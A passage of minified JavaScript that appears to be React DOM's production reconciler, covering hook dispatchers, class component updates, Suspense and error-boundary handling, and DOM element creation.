o=Ss(e),d={lane:o,action:i,hasEagerState:!1,eagerState:null,next:null};if(Ed(e))Cd(t,d);else{var f=e.alternate;if(e.lanes===0&&(f===null||f.lanes===0)&&(f=t.lastRenderedReducer,f!==null))try{var g=t.lastRenderedState,b=f(g,i);if(d.hasEagerState=!0,d.eagerState=b,gr(b,g)){var N=t.interleaved;N===null?(d.next=d,po(t)):(d.next=N.next,N.next=d),t.interleaved=d;return}}catch{}i=nd(e,t,d,o),i!==null&&(d=Pt(),jr(i,e,o,d),Td(i,t,o))}}function Ed(e){var t=e.alternate;return e===Qe||t!==null&&t===Qe}function Cd(e,t){ka=Ci=!0;var i=e.pending;i===null?t.next=t:(t.next=i.next,i.next=t),e.pending=t}function Td(e,t,i){if((i&4194240)!==0){var o=t.lanes;o&=e.pendingLanes,i|=o,t.lanes=i,Cl(e,i)}}var Pi={readContext:ar,useCallback:St,useContext:St,useEffect:St,useImperativeHandle:St,useInsertionEffect:St,useLayoutEffect:St,useMemo:St,useReducer:St,useRef:St,useState:St,useDebugValue:St,useDeferredValue:St,useTransition:St,useMutableSource:St,useSyncExternalStore:St,useId:St,unstable_isNewReconciler:!1},im={readContext:ar,useCallback:function(e,t){return Lr().memoizedState=[e,t===void 0?null:t],e},useContext:ar,useEffect:yd,useImperativeHandle:function(e,t,i){return i=i!=null?i.concat([e]):null,Ti(4194308,4,bd.bind(null,t,e),i)},useLayoutEffect:function(e,t){return Ti(4194308,4,e,t)},useInsertionEffect:function(e,t){return Ti(4,2,e,t)},useMemo:function(e,t){var i=Lr();return t=t===void 0?null:t,e=e(),i.memoizedState=[e,t],e},useReducer:function(e,t,i){var o=Lr();return t=i!==void 0?i(t):t,o.memoizedState=o.baseState=t,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:t},o.queue=e,e=e.dispatch=nm.bind(null,Qe,e),[o.memoizedState,e]},useRef:function(e){var t=Lr();return e={current:e},t.memoizedState=e},useState:xd,useDebugValue:Eo,useDeferredValue:function(e){return Lr().memoizedState=e},useTransition:function(){var e=xd(!1),t=e[0];return e=sm.bind(null,e[1]),Lr().memoizedState=e,[t,e]},useMutableSource:function(){},useSyncExternalStore:function(e,t,i){var o=Qe,d=Lr();if(Je){if(i===void 0)throw Error(n(407));i=i()}else{if(i=t(),xt===null)throw Error(n(349));(Ks&30)!==0||dd(o,t,i)}d.memoizedState=i;var f={value:i,getSnapshot:t};return d.queue=f,yd(fd.bind(null,o,f,e),[e]),o.flags|=2048,Sa(9,hd.bind(null,o,f,i,t),void 0,null),i},useId:function(){var e=Lr(),t=xt.identifierPrefix;if(Je){var i=Jr,o=Gr;i=(o&~(1<<32-xr(o)-1)).toString(32)+i,t=":"+t+"R"+i,i=_a++,0<i&&(t+="H"+i.toString(32)),t+=":"}else i=rm++,t=":"+t+"r"+i.toString(32)+":";return e.memoizedState=t},unstable_isNewReconciler:!1},lm={readContext:ar,useCallback:kd,useContext:ar,useEffect:So,useImperativeHandle:jd,useInsertionEffect:vd,useLayoutEffect:wd,useMemo:_d,useReducer:_o,useRef:gd,useState:function(){return _o(Na)},useDebugValue:Eo,useDeferredValue:function(e){var t=ir();return Nd(t,ut.memoizedState,e)},useTransition:function(){var e=_o(Na)[0],t=ir().memoizedState;return[e,t]},useMutableSource:cd,useSyncExternalStore:ud,useId:Sd,unstable_isNewReconciler:!1},om={readContext:ar,useCallback:kd,useContext:ar,useEffect:So,useImperativeHandle:jd,useInsertionEffect:vd,useLayoutEffect:wd,useMemo:_d,useReducer:No,useRef:gd,useState:function(){return No(Na)},useDebugValue:Eo,useDeferredValue:function(e){var t=ir();return ut===null?t.memoizedState=e:Nd(t,ut.memoizedState,e)},useTransition:function(){var e=No(Na)[0],t=ir().memoizedState;return[e,t]},useMutableSource:cd,useSyncExternalStore:ud,useId:Sd,unstable_isNewReconciler:!1};function vr(e,t){if(e&&e.defaultProps){t=ee({},t),e=e.defaultProps;for(var i in e)t[i]===void 0&&(t[i]=e[i]);return t}return t}function Co(e,t,i,o){t=e.memoizedState,i=i(o,t),i=i==null?t:ee({},t,i),e.memoizedState=i,e.lanes===0&&(e.updateQueue.baseState=i)}var Ai={isMounted:function(e){return(e=e._reactInternals)?qt(e)===e:!1},enqueueSetState:function(e,t,i){e=e._reactInternals;var o=Pt(),d=Ss(e),f=Qr(o,d);f.payload=t,i!=null&&(f.callback=i),t=js(e,f,d),t!==null&&(jr(t,e,d,o),_i(t,e,d))},enqueueReplaceState:function(e,t,i){e=e._reactInternals;var o=Pt(),d=Ss(e),f=Qr(o,d);f.tag=1,f.payload=t,i!=null&&(f.callback=i),t=js(e,f,d),t!==null&&(jr(t,e,d,o),_i(t,e,d))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var i=Pt(),o=Ss(e),d=Qr(i,o);d.tag=2,t!=null&&(d.callback=t),t=js(e,d,o),t!==null&&(jr(t,e,o,i),_i(t,e,o))}};function Rd(e,t,i,o,d,f,g){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(o,f,g):t.prototype&&t.prototype.isPureReactComponent?!ha(i,o)||!ha(d,f):!0}function Pd(e,t,i){var o=!1,d=vs,f=t.contextType;return typeof f=="object"&&f!==null?f=ar(f):(d=$t(t)?Bs:Nt.current,o=t.contextTypes,f=(o=o!=null)?wn(e,d):vs),t=new t(i,f),e.memoizedState=t.state!==null&&t.state!==void 0?t.state:null,t.updater=Ai,e.stateNode=t,t._reactInternals=e,o&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=d,e.__reactInternalMemoizedMaskedChildContext=f),t}function Ad(e,t,i,o){e=t.state,typeof t.componentWillReceiveProps=="function"&&t.componentWillReceiveProps(i,o),typeof t.UNSAFE_componentWillReceiveProps=="function"&&t.UNSAFE_componentWillReceiveProps(i,o),t.state!==e&&Ai.enqueueReplaceState(t,t.state,null)}function To(e,t,i,o){var d=e.stateNode;d.props=i,d.state=e.memoizedState,d.refs={},mo(e);var f=t.contextType;typeof f=="object"&&f!==null?d.context=ar(f):(f=$t(t)?Bs:Nt.current,d.context=wn(e,f)),d.state=e.memoizedState,f=t.getDerivedStateFromProps,typeof f=="function"&&(Co(e,t,f,i),d.state=e.memoizedState),typeof t.getDerivedStateFromProps=="function"||typeof d.getSnapshotBeforeUpdate=="function"||typeof d.UNSAFE_componentWillMount!="function"&&typeof d.componentWillMount!="function"||(t=d.state,typeof d.componentWillMount=="function"&&d.componentWillMount(),typeof d.UNSAFE_componentWillMount=="function"&&d.UNSAFE_componentWillMount(),t!==d.state&&Ai.enqueueReplaceState(d,d.state,null),Ni(e,i,d,o),d.state=e.memoizedState),typeof d.componentDidMount=="function"&&(e.flags|=4194308)}function Cn(e,t){try{var i="",o=t;do i+=Ce(o),o=o.return;while(o);var d=i}catch(f){d=`
Error generating stack: `+f.message+`
`+f.stack}return{value:e,source:t,stack:d,digest:null}}function Ro(e,t,i){return{value:e,source:null,stack:i??null,digest:t??null}}function Po(e,t){try{console.error(t.value)}catch(i){setTimeout(function(){throw i})}}var cm=typeof WeakMap=="function"?WeakMap:Map;function Od(e,t,i){i=Qr(-1,i),i.tag=3,i.payload={element:null};var o=t.value;return i.callback=function(){Li||(Li=!0,Ho=o),Po(e,t)},i}function Id(e,t,i){i=Qr(-1,i),i.tag=3;var o=e.type.getDerivedStateFromError;if(typeof o=="function"){var d=t.value;i.payload=function(){return o(d)},i.callback=function(){Po(e,t)}}var f=e.stateNode;return f!==null&&typeof f.componentDidCatch=="function"&&(i.callback=function(){Po(e,t),typeof o!="function"&&(_s===null?_s=new Set([this]):_s.add(this));var g=t.stack;this.componentDidCatch(t.value,{componentStack:g!==null?g:""})}),i}function $d(e,t,i){var o=e.pingCache;if(o===null){o=e.pingCache=new cm;var d=new Set;o.set(t,d)}else d=o.get(t),d===void 0&&(d=new Set,o.set(t,d));d.has(i)||(d.add(i),e=km.bind(null,e,t,i),t.then(e,e))}function Dd(e){do{var t;if((t=e.tag===13)&&(t=e.memoizedState,t=t!==null?t.dehydrated!==null:!0),t)return e;e=e.return}while(e!==null);return null}function zd(e,t,i,o,d){return(e.mode&1)===0?(e===t?e.flags|=65536:(e.flags|=128,i.flags|=131072,i.flags&=-52805,i.tag===1&&(i.alternate===null?i.tag=17:(t=Qr(-1,1),t.tag=2,js(i,t,1))),i.lanes|=1),e):(e.flags|=65536,e.lanes=d,e)}var um=H.ReactCurrentOwner,Dt=!1;function Rt(e,t,i,o){t.child=e===null?sd(t,null,i,o):_n(t,e.child,i,o)}function Ud(e,t,i,o,d){i=i.render;var f=t.ref;return Sn(t,d),o=jo(e,t,i,o,f,d),i=ko(),e!==null&&!Dt?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~d,Xr(e,t,d)):(Je&&i&&no(t),t.flags|=1,Rt(e,t,o,d),t.child)}function Ld(e,t,i,o,d){if(e===null){var f=i.type;return typeof f=="function"&&!Zo(f)&&f.defaultProps===void 0&&i.compare===null&&i.defaultProps===void 0?(t.tag=15,t.type=f,Md(e,t,f,o,d)):(e=Vi(i.type,null,o,t,t.mode,d),e.ref=t.ref,e.return=t,t.child=e)}if(f=e.child,(e.lanes&d)===0){var g=f.memoizedProps;if(i=i.compare,i=i!==null?i:ha,i(g,o)&&e.ref===t.ref)return Xr(e,t,d)}return t.flags|=1,e=Cs(f,o),e.ref=t.ref,e.return=t,t.child=e}function Md(e,t,i,o,d){if(e!==null){var f=e.memoizedProps;if(ha(f,o)&&e.ref===t.ref)if(Dt=!1,t.pendingProps=o=f,(e.lanes&d)!==0)(e.flags&131072)!==0&&(Dt=!0);else return t.lanes=e.lanes,Xr(e,t,d)}return Ao(e,t,i,o,d)}function Fd(e,t,i){var o=t.pendingProps,d=o.children,f=e!==null?e.memoizedState:null;if(o.mode==="hidden")if((t.mode&1)===0)t.memoizedState={baseLanes:0,cachePool:null,transitions:null},qe(Rn,Jt),Jt|=i;else{if((i&1073741824)===0)return e=f!==null?f.baseLanes|i:i,t.lanes=t.childLanes=1073741824,t.memoizedState={baseLanes:e,cachePool:null,transitions:null},t.updateQueue=null,qe(Rn,Jt),Jt|=e,null;t.memoizedState={baseLanes:0,cachePool:null,transitions:null},o=f!==null?f.baseLanes:i,qe(Rn,Jt),Jt|=o}else f!==null?(o=f.baseLanes|i,t.memoizedState=null):o=i,qe(Rn,Jt),Jt|=o;return Rt(e,t,d,i),t.child}function Bd(e,t){var i=t.ref;(e===null&&i!==null||e!==null&&e.ref!==i)&&(t.flags|=512,t.flags|=2097152)}function Ao(e,t,i,o,d){var f=$t(i)?Bs:Nt.current;return f=wn(t,f),Sn(t,d),i=jo(e,t,i,o,f,d),o=ko(),e!==null&&!Dt?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~d,Xr(e,t,d)):(Je&&o&&no(t),t.flags|=1,Rt(e,t,i,d),t.child)}function Wd(e,t,i,o,d){if($t(i)){var f=!0;xi(t)}else f=!1;if(Sn(t,d),t.stateNode===null)Ii(e,t),Pd(t,i,o),To(t,i,o,d),o=!0;else if(e===null){var g=t.stateNode,b=t.memoizedProps;g.props=b;var N=g.context,$=i.contextType;typeof $=="object"&&$!==null?$=ar($):($=$t(i)?Bs:Nt.current,$=wn(t,$));var V=i.getDerivedStateFromProps,K=typeof V=="function"||typeof g.getSnapshotBeforeUpdate=="function";K||typeof g.UNSAFE_componentWillReceiveProps!="function"&&typeof g.componentWillReceiveProps!="function"||(b!==o||N!==$)&&Ad(t,g,o,$),bs=!1;var q=t.memoizedState;g.state=q,Ni(t,o,g,d),N=t.memoizedState,b!==o||q!==N||It.current||bs?(typeof V=="function"&&(Co(t,i,V,o),N=t.memoizedState),(b=bs||Rd(t,i,b,o,q,N,$))?(K||typeof g.UNSAFE_componentWillMount!="function"&&typeof g.componentWillMount!="function"||(typeof g.componentWillMount=="function"&&g.componentWillMount(),typeof g.UNSAFE_componentWillMount=="function"&&g.UNSAFE_componentWillMount()),typeof g.componentDidMount=="function"&&(t.flags|=4194308)):(typeof g.componentDidMount=="function"&&(t.flags|=4194308),t.memoizedProps=o,t.memoizedState=N),g.props=o,g.state=N,g.context=$,o=b):(typeof g.componentDidMount=="function"&&(t.flags|=4194308),o=!1)}else{g=t.stateNode,ad(e,t),b=t.memoizedProps,$=t.type===t.elementType?b:vr(t.type,b),g.props=$,K=t.pendingProps,q=g.context,N=i.contextType,typeof N=="object"&&N!==null?N=ar(N):(N=$t(i)?Bs:Nt.current,N=wn(t,N));var re=i.getDerivedStateFromProps;(V=typeof re=="function"||typeof g.getSnapshotBeforeUpdate=="function")||typeof g.UNSAFE_componentWillReceiveProps!="function"&&typeof g.componentWillReceiveProps!="function"||(b!==K||q!==N)&&Ad(t,g,o,N),bs=!1,q=t.memoizedState,g.state=q,Ni(t,o,g,d);var ie=t.memoizedState;b!==K||q!==ie||It.current||bs?(typeof re=="function"&&(Co(t,i,re,o),ie=t.memoizedState),($=bs||Rd(t,i,$,o,q,ie,N)||!1)?(V||typeof g.UNSAFE_componentWillUpdate!="function"&&typeof g.componentWillUpdate!="function"||(typeof g.componentWillUpdate=="function"&&g.componentWillUpdate(o,ie,N),typeof g.UNSAFE_componentWillUpdate=="function"&&g.UNSAFE_componentWillUpdate(o,ie,N)),typeof g.componentDidUpdate=="function"&&(t.flags|=4),typeof g.getSnapshotBeforeUpdate=="function"&&(t.flags|=1024)):(typeof g.componentDidUpdate!="function"||b===e.memoizedProps&&q===e.memoizedState||(t.flags|=4),typeof g.getSnapshotBeforeUpdate!="function"||b===e.memoizedProps&&q===e.memoizedState||(t.flags|=1024),t.memoizedProps=o,t.memoizedState=ie),g.props=o,g.state=ie,g.context=N,o=$):(typeof g.componentDidUpdate!="function"||b===e.memoizedProps&&q===e.memoizedState||(t.flags|=4),typeof g.getSnapshotBeforeUpdate!="function"||b===e.memoizedProps&&q===e.memoizedState||(t.flags|=1024),o=!1)}return Oo(e,t,i,o,f,d)}function Oo(e,t,i,o,d,f){Bd(e,t);var g=(t.flags&128)!==0;if(!o&&!g)return d&&Gu(t,i,!1),Xr(e,t,f);o=t.stateNode,um.current=t;var b=g&&typeof i.getDerivedStateFromError!="function"?null:o.render();return t.flags|=1,e!==null&&g?(t.child=_n(t,e.child,null,f),t.child=_n(t,null,b,f)):Rt(e,t,b,f),t.memoizedState=o.state,d&&Gu(t,i,!0),t.child}function qd(e){var t=e.stateNode;t.pendingContext?Hu(e,t.pendingContext,t.pendingContext!==t.context):t.context&&Hu(e,t.context,!1),xo(e,t.containerInfo)}function Vd(e,t,i,o,d){return kn(),oo(d),t.flags|=256,Rt(e,t,i,o),t.child}var Io={dehydrated:null,treeContext:null,retryLane:0};function $o(e){return{baseLanes:e,cachePool:null,transitions:null}}function Hd(e,t,i){var o=t.pendingProps,d=Ye.current,f=!1,g=(t.flags&128)!==0,b;if((b=g)||(b=e!==null&&e.memoizedState===null?!1:(d&2)!==0),b?(f=!0,t.flags&=-129):(e===null||e.memoizedState!==null)&&(d|=1),qe(Ye,d&1),e===null)return lo(t),e=t.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?((t.mode&1)===0?t.lanes=1:e.data==="$!"?t.lanes=8:t.lanes=1073741824,null):(g=o.children,e=o.fallback,f?(o=t.mode,f=t.child,g={mode:"hidden",children:g},(o&1)===0&&f!==null?(f.childLanes=0,f.pendingProps=g):f=Hi(g,o,0,null),e=Xs(e,o,i,null),f.return=t,e.return=t,f.sibling=e,t.child=f,t.child.memoizedState=$o(i),t.memoizedState=Io,e):Do(t,g));if(d=e.memoizedState,d!==null&&(b=d.dehydrated,b!==null))return dm(e,t,g,o,b,d,i);if(f){f=o.fallback,g=t.mode,d=e.child,b=d.sibling;var N={mode:"hidden",children:o.children};return(g&1)===0&&t.child!==d?(o=t.child,o.childLanes=0,o.pendingProps=N,t.deletions=null):(o=Cs(d,N),o.subtreeFlags=d.subtreeFlags&14680064),b!==null?f=Cs(b,f):(f=Xs(f,g,i,null),f.flags|=2),f.return=t,o.return=t,o.sibling=f,t.child=o,o=f,f=t.child,g=e.child.memoizedState,g=g===null?$o(i):{baseLanes:g.baseLanes|i,cachePool:null,transitions:g.transitions},f.memoizedState=g,f.childLanes=e.childLanes&~i,t.memoizedState=Io,o}return f=e.child,e=f.sibling,o=Cs(f,{mode:"visible",children:o.children}),(t.mode&1)===0&&(o.lanes=i),o.return=t,o.sibling=null,e!==null&&(i=t.deletions,i===null?(t.deletions=[e],t.flags|=16):i.push(e)),t.child=o,t.memoizedState=null,o}function Do(e,t){return t=Hi({mode:"visible",children:t},e.mode,0,null),t.return=e,e.child=t}function Oi(e,t,i,o){return o!==null&&oo(o),_n(t,e.child,null,i),e=Do(t,t.pendingProps.children),e.flags|=2,t.memoizedState=null,e}function dm(e,t,i,o,d,f,g){if(i)return t.flags&256?(t.flags&=-257,o=Ro(Error(n(422))),Oi(e,t,g,o)):t.memoizedState!==null?(t.child=e.child,t.flags|=128,null):(f=o.fallback,d=t.mode,o=Hi({mode:"visible",children:o.children},d,0,null),f=Xs(f,d,g,null),f.flags|=2,o.return=t,f.return=t,o.sibling=f,t.child=o,(t.mode&1)!==0&&_n(t,e.child,null,g),t.child.memoizedState=$o(g),t.memoizedState=Io,f);if((t.mode&1)===0)return Oi(e,t,g,null);if(d.data==="$!"){if(o=d.nextSibling&&d.nextSibling.dataset,o)var b=o.dgst;return o=b,f=Error(n(419)),o=Ro(f,o,void 0),Oi(e,t,g,o)}if(b=(g&e.childLanes)!==0,Dt||b){if(o=xt,o!==null){switch(g&-g){case 4:d=2;break;case 16:d=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:d=32;break;case 536870912:d=268435456;break;default:d=0}d=(d&(o.suspendedLanes|g))!==0?0:d,d!==0&&d!==f.retryLane&&(f.retryLane=d,Yr(e,d),jr(o,e,d,-1))}return Xo(),o=Ro(Error(n(421))),Oi(e,t,g,o)}return d.data==="$?"?(t.flags|=128,t.child=e.child,t=_m.bind(null,e),d._reactRetry=t,null):(e=f.treeContext,Gt=gs(d.nextSibling),Kt=t,Je=!0,yr=null,e!==null&&(sr[nr++]=Gr,sr[nr++]=Jr,sr[nr++]=Ws,Gr=e.id,Jr=e.overflow,Ws=t),t=Do(t,o.children),t.flags|=4096,t)}function Kd(e,t,i){e.lanes|=t;var o=e.alternate;o!==null&&(o.lanes|=t),fo(e.return,t,i)}function zo(e,t,i,o,d){var f=e.memoizedState;f===null?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:o,tail:i,tailMode:d}:(f.isBackwards=t,f.rendering=null,f.renderingStartTime=0,f.last=o,f.tail=i,f.tailMode=d)}function Gd(e,t,i){var o=t.pendingProps,d=o.revealOrder,f=o.tail;if(Rt(e,t,o.children,i),o=Ye.current,(o&2)!==0)o=o&1|2,t.flags|=128;else{if(e!==null&&(e.flags&128)!==0)e:for(e=t.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&Kd(e,i,t);else if(e.tag===19)Kd(e,i,t);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break e;for(;e.sibling===null;){if(e.return===null||e.return===t)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}o&=1}if(qe(Ye,o),(t.mode&1)===0)t.memoizedState=null;else switch(d){case"forwards":for(i=t.child,d=null;i!==null;)e=i.alternate,e!==null&&Si(e)===null&&(d=i),i=i.sibling;i=d,i===null?(d=t.child,t.child=null):(d=i.sibling,i.sibling=null),zo(t,!1,d,i,f);break;case"backwards":for(i=null,d=t.child,t.child=null;d!==null;){if(e=d.alternate,e!==null&&Si(e)===null){t.child=d;break}e=d.sibling,d.sibling=i,i=d,d=e}zo(t,!0,i,null,f);break;case"together":zo(t,!1,null,null,void 0);break;default:t.memoizedState=null}return t.child}function Ii(e,t){(t.mode&1)===0&&e!==null&&(e.alternate=null,t.alternate=null,t.flags|=2)}function Xr(e,t,i){if(e!==null&&(t.dependencies=e.dependencies),Gs|=t.lanes,(i&t.childLanes)===0)return null;if(e!==null&&t.child!==e.child)throw Error(n(153));if(t.child!==null){for(e=t.child,i=Cs(e,e.pendingProps),t.child=i,i.return=t;e.sibling!==null;)e=e.sibling,i=i.sibling=Cs(e,e.pendingProps),i.return=t;i.sibling=null}return t.child}function hm(e,t,i){switch(t.tag){case 3:qd(t),kn();break;case 5:od(t);break;case 1:$t(t.type)&&xi(t);break;case 4:xo(t,t.stateNode.containerInfo);break;case 10:var o=t.type._context,d=t.memoizedProps.value;qe(ji,o._currentValue),o._currentValue=d;break;case 13:if(o=t.memoizedState,o!==null)return o.dehydrated!==null?(qe(Ye,Ye.current&1),t.flags|=128,null):(i&t.child.childLanes)!==0?Hd(e,t,i):(qe(Ye,Ye.current&1),e=Xr(e,t,i),e!==null?e.sibling:null);qe(Ye,Ye.current&1);break;case 19:if(o=(i&t.childLanes)!==0,(e.flags&128)!==0){if(o)return Gd(e,t,i);t.flags|=128}if(d=t.memoizedState,d!==null&&(d.rendering=null,d.tail=null,d.lastEffect=null),qe(Ye,Ye.current),o)break;return null;case 22:case 23:return t.lanes=0,Fd(e,t,i)}return Xr(e,t,i)}var Jd,Uo,Yd,Qd;Jd=function(e,t){for(var i=t.child;i!==null;){if(i.tag===5||i.tag===6)e.appendChild(i.stateNode);else if(i.tag!==4&&i.child!==null){i.child.return=i,i=i.child;continue}if(i===t)break;for(;i.sibling===null;){if(i.return===null||i.return===t)return;i=i.return}i.sibling.return=i.return,i=i.sibling}},Uo=function(){},Yd=function(e,t,i,o){var d=e.memoizedProps;if(d!==o){e=t.stateNode,Hs(Ur.current);var f=null;switch(i){case"input":d=Ne(e,d),o=Ne(e,o),f=[];break;case"select":d=ee({},d,{value:void 0}),o=ee({},o,{value:void 0}),f=[];break;case"textarea":d=hr(e,d),o=hr(e,o),f=[];break;default:typeof d.onClick!="function"&&typeof o.onClick=="function"&&(e.onclick=fi)}Br(i,o);var g;i=null;for($ in d)if(!o.hasOwnProperty($)&&d.hasOwnProperty($)&&d[$]!=null)if($==="style"){var b=d[$];for(g in b)b.hasOwnProperty(g)&&(i||(i={}),i[g]="")}else $!=="dangerouslySetInnerHTML"&&$!=="children"&&$!=="suppressContentEditableWarning"&&$!=="suppressHydrationWarning"&&$!=="autoFocus"&&(c.hasOwnProperty($)?f||(f=[]):(f=f||[]).push($,null));for($ in o){var N=o[$];if(b=d?.[$],o.hasOwnProperty($)&&N!==b&&(N!=null||b!=null))if($==="style")if(b){for(g in b)!b.hasOwnProperty(g)||N&&N.hasOwnProperty(g)||(i||(i={}),i[g]="");for(g in N)N.hasOwnProperty(g)&&b[g]!==N[g]&&(i||(i={}),i[g]=N[g])}else i||(f||(f=[]),f.push($,i)),i=N;else $==="dangerouslySetInnerHTML"?(N=N?N.__html:void 0,b=b?b.__html:void 0,N!=null&&b!==N&&(f=f||[]).push($,N)):$==="children"?typeof N!="string"&&typeof N!="number"||(f=f||[]).push($,""+N):$!=="suppressContentEditableWarning"&&$!=="suppressHydrationWarning"&&(c.hasOwnProperty($)?(N!=null&&$==="onScroll"&&He("scroll",e),f||b===N||(f=[])):(f=f||[]).push($,N))}i&&(f=f||[]).push("style",i);var $=f;(t.updateQueue=$)&&(t.flags|=4)}},Qd=function(e,t,i,o){i!==o&&(t.flags|=4)};function Ea(e,t){if(!Je)switch(e.tailMode){case"hidden":t=e.tail;for(var i=null;t!==null;)t.alternate!==null&&(i=t),t=t.sibling;i===null?e.tail=null:i.sibling=null;break;case"collapsed":i=e.tail;for(var o=null;i!==null;)i.alternate!==null&&(o=i),i=i.sibling;o===null?t||e.tail===null?e.tail=null:e.tail.sibling=null:o.sibling=null}}function Et(e){var t=e.alternate!==null&&e.alternate.child===e.child,i=0,o=0;if(t)for(var d=e.child;d!==null;)i|=d.lanes|d.childLanes,o|=d.subtreeFlags&14680064,o|=d.flags&14680064,d.return=e,d=d.sibling;else for(d=e.child;d!==null;)i|=d.lanes|d.childLanes,o|=d.subtreeFlags,o|=d.flags,d.return=e,d=d.sibling;return e.subtreeFlags|=o,e.childLanes=i,t}function fm(e,t,i){var o=t.pendingProps;switch(ao(t),t.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return Et(t),null;case 1:return $t(t.type)&&mi(),Et(t),null;case 3:return o=t.stateNode,En(),Ke(It),Ke(Nt),vo(),o.pendingContext&&(o.context=o.pendingContext,o.pendingContext=null),(e===null||e.child===null)&&(wi(t)?t.flags|=4:e===null||e.memoizedState.isDehydrated&&(t.flags&256)===0||(t.flags|=1024,yr!==null&&(Jo(yr),yr=null))),Uo(e,t),Et(t),null;case 5:go(t);var d=Hs(ja.current);if(i=t.type,e!==null&&t.stateNode!=null)Yd(e,t,i,o,d),e.ref!==t.ref&&(t.flags|=512,t.flags|=2097152);else{if(!o){if(t.stateNode===null)throw Error(n(166));return Et(t),null}if(e=Hs(Ur.current),wi(t)){o=t.stateNode,i=t.type;var f=t.memoizedProps;switch(o[zr]=t,o[ga]=f,e=(t.mode&1)!==0,i){case"dialog":He("cancel",o),He("close",o);break;case"iframe":case"object":case"embed":He("load",o);break;case"video":case"audio":for(d=0;d<pa.length;d++)He(pa[d],o);break;case"source":He("error",o);break;case"img":case"image":case"link":He("error",o),He("load",o);break;case"details":He("toggle",o);break;case"input":kt(o,f),He("invalid",o);break;case"select":o._wrapperState={wasMultiple:!!f.multiple},He("invalid",o);break;case"textarea":Cr(o,f),He("invalid",o)}Br(i,f),d=null;for(var g in f)if(f.hasOwnProperty(g)){var b=f[g];g==="children"?typeof b=="string"?o.textContent!==b&&(f.suppressHydrationWarning!==!0&&hi(o.textContent,b,e),d=["children",b]):typeof b=="number"&&o.textContent!==""+b&&(f.suppressHydrationWarning!==!0&&hi(o.textContent,b,e),d=["children",""+b]):c.hasOwnProperty(g)&&b!=null&&g==="onScroll"&&He("scroll",o)}switch(i){case"input":Ae(o),ft(o,f,!0);break;case"textarea":Ae(o),Rr(o);break;case"select":case"option":break;default:typeof f.onClick=="function"&&(o.onclick=fi)}o=d,t.updateQueue=o,o!==null&&(t.flags|=4)}else{g=d.nodeType===9?d:d.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=Pr(i)),e==="http://www.w3.org/1999/xhtml"?i==="script"?(e=g.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof o.is=="string"?e=g.createElement(i,{is:o.is}):(e=g.createElement(i),i==="select"&&(g=e,o.multiple?g.multiple=!0:o.size&&(g.size=o.size))):e=g.createElementNS(e,i),e[zr]=t,e[ga]=o,Jd(e,t,!1,!1),t.stateNode=e;e:{switch(g=pr(i,o),i){case"dialog":He("cancel",e),He("close",e),d=o;break;case"iframe":case"object":case"embed":He("load",e),d=o;break;case"video":case"audio":for(d=0;d<pa.length;d++)He(pa[d],e);d=o;break;case"source":He("error",e),d=o;break;case"img":case"image":case"link":He("error",e),He("load",e),d=o;break;case"details":He("toggle",e),d=o;break;case"input":kt(e,o),d=Ne(e,o),He("invalid",e);break;case"option":d=o;break;case"select":e._wrapperState={wasMultiple:!!o.multiple},d=ee({},o,{value:void 0}),He("invalid",e);break;case"textarea":Cr(e,o),d=hr(e,o),He("invalid",e);break;default:d=o}Br(i,d),b=d;for(f in b)if(b.hasOwnProperty(f)){var N=b[f];f==="style"?tr(e,N):f==="dangerouslySetInnerHTML"?(N=N?N.__html:void 0,N!=null&&os(e,N)):f==="children"?typeof N=="string"?(i!=="textarea"||N!=="")&&Ft(e,N):typeof N=="number"&&Ft(e,""+N):f!=="suppressContentEditableWarning"&&f!=="suppressHydrationWarning"&&f!=="autoFocus"&&(c.hasOwnProperty(f)?N!=null&&f==="onScroll"&&He("scroll",e):N!=null&&I(e,f,N,g))}switch(i){case"input":Ae(e),ft(e,o,!1);break;case"textarea":Ae(e),Rr(e);break;case"option":o.value!=null&&e.setAttribute("value",""+fe(o.value));break;case"select":e.multiple=!!o.multiple,f=o.value,f!=null?_t(e,!!o.multiple,f,!1):o.defaultValue!=null&&_t(e,!!o.multiple,o.defaultValue,!0);break;default:typeof d.onClick=="function"&&(e.onclick=fi)}switch(i){case"button":case"input":case"select":case"textarea":o=!!o.autoFocus;break e;case"img":o=!0;break e;default:o=!1}}o&&(t.flags|=4)}t.ref!==null&&(t.flags|=512,t.flags|=2097152)}return Et(t),null;case 6:if(e&&t.stateNode!=null)Qd(e,t,e.memoizedProps,o);else{if(typeof o!="string"&&t.stateNode===null)throw Error(n(166));if(i=Hs(ja.current),Hs(Ur.current),wi(t)){if(o=t.stateNode,i=t.memoizedProps,o[zr]=t,(f=o.nodeValue!==i)&&(e=Kt,e!==null))switch(e.tag){case 3:hi(o.nodeValue,i,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&hi(o.nodeValue,i,(e.mode&1)!==0)}f&&(t.flags|=4)}else o=(i.nodeType===9?i:i.ownerDocument).createTextNode(o),o[zr]=t,t.stateNode=o}return Et(t),null;case 13:if(Ke(Ye),o=t.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(Je&&Gt!==null&&(t.mode&1)!==0&&(t.flags&128)===0)ed(),kn(),t.flags|=98560,f=!1;else if(f=wi(t),o!==null&&o.dehydrated!==null){if(e===null){if(!f)throw Error(n(318));if(f=t.memoizedState,f=f!==null?f.dehydrated:null,!f)throw Error(n(317));f[zr]=t}else kn(),(t.flags&128)===0&&(t.memoizedState=null),t.flags|=4;Et(t),f=!1}else yr!==null&&(Jo(yr),yr=null),f=!0;if(!f)return 